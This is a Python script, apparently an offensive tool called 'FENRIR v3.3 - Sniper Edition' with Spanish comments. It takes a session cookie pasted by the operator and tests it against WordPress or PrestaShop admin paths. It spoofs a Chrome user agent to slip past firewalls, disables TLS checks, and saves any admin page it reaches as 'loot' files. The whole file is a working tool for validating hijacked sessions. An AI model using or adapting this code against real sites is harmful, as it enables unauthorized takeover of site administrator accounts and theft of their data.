import asyncio
import aiohttp
import base64
import json
import sys
import re
import time
import logging
from dataclasses import dataclass
from typing import List, Optional, Dict, Any
from enum import Enum, auto
from http.cookies import SimpleCookie
from yarl import URL

# ==============================================================================
#  🛠️ CONFIGURACIÓN & UTILS (ARCHITECT LEVEL)
# ==============================================================================

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(message)s", datefmt="%H:%M:%S")
logger = logging.getLogger("FENRIR")

class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    CYAN = "\033[96m"
    RESET = "\033[0m"
    BOLD = "\033[1m"

def colorize(text: str, color: str) -> str:
    return f"{color}{text}{Colors.RESET}"

class TargetType(Enum):
    WORDPRESS = auto()
    PRESTASHOP = auto()
    GENERIC = auto()

@dataclass
class TargetConfig:
    base_url: str
    type: TargetType
    # Usamos User-Agent de Chrome legítimo para evitar bloqueo de Firewall
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    timeout: int = 20

# ==============================================================================
#  🐺 CORE ENGINE: FENRIR (SNIPER MODE)
# ==============================================================================

class FenrirEngine:
    def __init__(self, config: TargetConfig):
        self.config = config
        self.session: Optional[aiohttp.ClientSession] = None

    async def __aenter__(self):
        jar = aiohttp.CookieJar(unsafe=True)
        connector = aiohttp.TCPConnector(ssl=False)
        
        self.session = aiohttp.ClientSession(
            base_url=self.config.base_url,
            connector=connector,
            cookie_jar=jar,
            headers={"User-Agent": self.config.user_agent},
            timeout=aiohttp.ClientTimeout(total=self.config.timeout)
        )
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session: await self.session.close()

    def inject_raw_cookie(self, raw_cookie: str):
        if not self.session: return
        print(colorize("💉 Inyectando Cookies...", Colors.YELLOW))
        
        try:
            url_obj = URL(self.config.base_url)
            cookie = SimpleCookie()
            raw_cookie = raw_cookie.replace("Cookie: ", "").strip()
            
            if "=" not in raw_cookie:
                print(colorize("⚠️ ERROR CRÍTICO: Formato incorrecto. Copia 'Nombre=Valor'.", Colors.RED))
                print(f"   {Colors.CYAN}Ejemplo: PrestaShop-a8b...=def502...{Colors.RESET}")
                return

            cookie.load(raw_cookie)
            
            for key, morsel in cookie.items():
                self.session.cookie_jar.update_cookies({key: morsel.value}, response_url=url_obj)
            
            print(colorize(f"✅ Cookies cargadas: {list(cookie.keys())}", Colors.GREEN))
            
        except Exception as e:
            print(colorize(f"❌ Error inyectando cookies: {e}", Colors.RED))

    async def fuzz_endpoints(self, wordlist: List[str]):
        print(colorize(f"\n🐕 RASTREANDO ({self.config.type.name}) - MODO PRECISIÓN...", Colors.BOLD))
        tasks = [self._check_endpoint(path) for path in wordlist]
        await asyncio.gather(*tasks)

    async def _check_endpoint(self, path: str):
        if not self.session: return
        try:
            print(f"⏳ Verificando: {path} ...")
            
            async with self.session.get(path, allow_redirects=True) as resp:
                content = await resp.text()
                
                # --- TELEMETRÍA ---
                title_match = re.search('<title>(.*?)</title>', content, re.IGNORECASE)
                page_title = title_match.group(1).strip() if title_match else "Sin Título"
                
                status_color = Colors.GREEN if resp.status == 200 else Colors.YELLOW
                if resp.status >= 400: status_color = Colors.RED

                print(f"   [{colorize(str(resp.status), status_color)}] URL Real: {resp.url}")
                print(f"   📄 Título: {colorize(page_title[:60], Colors.CYAN)}...")

                # --- VALIDACIÓN CONTEXTUAL ---
                is_valid = False
                
                if self.config.type == TargetType.WORDPRESS:
                    # Fallo si vamos al login
                    if "wp-login.php" in str(resp.url) or "Log In" in content:
                        print(colorize("   ❌ FALLO: Rebote al Login (Cookie inválida).", Colors.RED))
                        return
                    # Éxito si vemos dashboard
                    success_keys = ["wp-admin-bar", "Howdy", "Hola,", "Cerrar sesión", "Log Out", "Escritorio", "Dashboard"]
                    if any(k in content for k in success_keys):
                        is_valid = True

                elif self.config.type == TargetType.PRESTASHOP:
                    # Fallo si vamos al login
                    if "login" in str(resp.url).lower() and "AdminLogin" not in path:
                        print(colorize("   ❌ FALLO: Rebote al Login.", Colors.RED))
                        return
                    
                    # Éxito si vemos elementos de admin
                    ps_keys = ["logout", "employee_box", "PrestaShop", "Cerrar sesión", "Avatar", "class=\"bootstrap\""]
                    if any(k in content for k in ps_keys):
                        is_valid = True

                # --- RESULTADO ---
                if is_valid:
                    print(f"   {colorize('🔥 ¡BOOM! ACCESO CONFIRMADO', Colors.GREEN)}")
                    filename = f"loot_{int(time.time())}.html"
                    with open(filename, "w", encoding="utf-8") as f: f.write(content)
                    print(f"   💾 Evidencia guardada en '{filename}'")
                
                elif resp.status == 200:
                    print(colorize("   ⚠️  200 OK pero no parece Admin (¿Redirección a Home?).", Colors.YELLOW))
                    with open("debug_fail.html", "w", encoding="utf-8") as f: f.write(content)

        except Exception as e:
            print(f"❌ Error de conexión: {e}")

# ==============================================================================
#  🏁 MAIN ENTRY POINT
# ==============================================================================

async def main():
    print(colorize("\n🐺 FENRIR v3.3 - SNIPER EDITION 🐺\n", Colors.RED))

    # 1. URL Base (Solo la raíz)
    base_input = input(">> URL Base (Raíz, ej: https://web.com): ").strip()
    if not base_input.startswith("http"): base_input = f"http://{base_input}"
    if not base_input.endswith("/"): base_input += "/"
    
    # 2. Tecnología (Para saber qué buscar en el HTML)
    print("\n[1] WordPress")
    print("[2] PrestaShop")
    t_choice = input(">> Tecnología Objetivo: ").strip()
    t_type = TargetType.WORDPRESS if t_choice == '1' else TargetType.PRESTASHOP
    
    config = TargetConfig(base_url=base_input, type=t_type)

    async with FenrirEngine(config) as engine:
        # 3. Cookie (La llave maestra)
        print(f"\n{Colors.YELLOW}👉 INYECCIÓN DE COOKIE (Formato: Nombre=Valor){Colors.RESET}")
        raw = input(">> Cookie String: ").strip()
        engine.inject_raw_cookie(raw)

        # 4. RUTA ESPECÍFICA (SNIPER INPUT)
        print(f"\n{Colors.CYAN}🎯 CONFIGURACIÓN DE OBJETIVO{Colors.RESET}")
        print("   Escribe la ruta exacta del admin (ej: /Backoffice, /wp-admin).")
        print("   Deja en blanco para usar lista automática.")
        custom_path = input(">> Ruta Específica: ").strip()

        wordlist = []
        if custom_path:
            # Si el usuario pone una ruta, solo atacamos esa
            if not custom_path.startswith("/") and not custom_path.startswith("http"):
                 custom_path = f"/{custom_path}" # Fix slash
            wordlist = [custom_path]
        else:
            # Fallback a listas automáticas
            if t_type == TargetType.WORDPRESS:
                wordlist = ["wp-admin/", "wp-admin/index.php"]
            else:
                wordlist = ["admin", "backoffice", "dashboard", "adm", "Backoffice"] # Añadida Backoffice mayúscula

        await engine.fuzz_endpoints(wordlist)

if __name__ == "__main__":
    try:
        if sys.platform == 'win32': 
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n👋 Abortado.")